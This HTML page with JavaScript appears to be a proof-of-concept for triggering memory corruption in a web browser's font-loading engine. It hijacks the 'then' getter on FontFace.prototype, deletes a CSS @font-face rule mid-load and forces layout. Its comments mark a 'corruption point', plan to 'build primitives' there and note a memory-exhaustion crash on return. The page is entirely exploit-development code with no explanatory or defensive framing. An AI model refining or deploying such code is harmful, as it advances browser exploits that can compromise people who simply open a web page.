<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body>
<div id="log" style="font-size: 16px; white-space: pre;"></div>
<script>
function log(msg) {
    document.getElementById('log').textContent += msg + '\n';
}

window.onload = () => {
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;
    
    let fired = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                
                log('GETTER START');
                
                // Create corruption
                let y = new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                let z = new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                
                log('Created y and z');
                log('y.status: ' + y.status);
                log('z.status: ' + z.status);
                log('A.status: ' + A.status);
                
                document.getElementById('s').sheet.deleteRule(0);
                log('Deleted CSS rule');
                
                document.body.offsetTop; // Corruption point
                log('After offsetTop');
                
                // AT THIS POINT - corruption exists, but we haven't returned yet
                // Try to build primitives HERE before returning
                
                log('y.status after: ' + y.status);
                log('z.status after: ' + z.status);
                log('A.status after: ' + A.status);
                
                // Probe for memory corruption
                try {
                    log('fonts.size: ' + document.fonts.size);
                    
                    // Try to read internal properties
                    log('y.family: ' + y.family);
                    log('y.weight: ' + y.weight);
                    
                } catch(e) {
                    log('EXCEPTION: ' + e.message);
                }
                
                log('GETTER END - about to return undefined');
                // When we return, the OOM happens
            }
            return undefined; // Returning triggers the memory exhaustion
        }
    });
    
    log('Calling fonts.load...');
    document.fonts.load('1em x', 'AB');
};
</script>
</body>
</html>
